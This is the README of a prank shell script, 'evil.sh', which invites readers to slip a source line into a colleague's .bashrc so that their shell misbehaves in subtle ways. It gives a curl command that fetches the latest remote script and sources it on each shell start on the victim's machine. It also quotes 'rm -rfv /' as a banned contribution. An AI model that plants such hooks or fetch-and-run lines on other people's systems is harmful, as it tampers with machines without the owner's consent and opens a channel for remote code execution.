# `evil.sh`

A collection of various subtle and not-so-subtle shell tweaks that will slowly drive people insane.

Feel like trolling a colleague? Just add a source line for evil.sh to their `.bash_profile` or `.bashrc` and watch the chaos ensue.

If their machine should always have access to the internet, you can add the line below to make their shell always retrieve and source the latest version.

`source <curl -s https://raw.githubusercontent.com/Oliver2213/evil.sh/master/evil.sh`

Be aware that the sourcing should happen at the end of the file, if you do not edit `evil.sh` before doing so, as `evil.sh` disables `alias` and `unalias`.

## NOTE

There are *big security implications* for doing it this way, and I am certainly not responsible for any resulting actions that happen on their machine because of this. That being said, I have removed all of the distructive stuff from the script, so no file deletion when $EDITOR gets called, etc. 

## Contributions

Evil suggestions and pull requests are welcome. Nothing obviously destructive should happen the moment `evil.sh` is sourced, and PRs that delete files won't be allowed. The objective is subtle, annoying tweaks that only take effect when the victim performs a certain action.
Frustration and fury, not despair and long-lasting hate because your joke got someone's totally awesome and irreplaceable file shredded.

## What is ok to add:
* Randomly choose other directories other than the one `cd` was told to use
* Tweak the shell so `man` reports that it can't find the requested manpage
* Make `du` report that the requested directory is the same as the user's intelligence level. (that is, verry small)

## Things that are not ok:

* a patch that adds `rm -rfv /` to `evil.sh`
* Randomly deleting files or directories the victim tries to access. this doesn't mean you can't, say, report that the file or directory in question isn't there, though 😏 as long as when it's all said and done everything is where it's supposed to be

## See also

* [`evil.js`](https://github.com/kitcambridge/evil.js)
* [`evil.css`](https://github.com/tlrobinson/evil.css)

## Credits

| [![twitter/mathias](https://gravatar.com/avatar/24e08a9ea84deb17ae121074d0f17125?s=70)](https://twitter.com/mathias "Follow @mathias on Twitter") | [![twitter/janmoesen](https://gravatar.com/avatar/f0e6c7e4835c71c987b13e0dc4ed3a72?s=70)](https://twitter.com/janmoesen "Follow @janmoesen on Twitter") |
|---|---|
| [Mathias Bynens](https://mathiasbynens.be/) | [Jan Moesen](http://jan.moesen.nu/) |

## License

Public domain.

## Obligatory disclaimer

`evil.sh` is purely for entertainment purposes. I’m not responsible for anything you do with `evil.sh`.
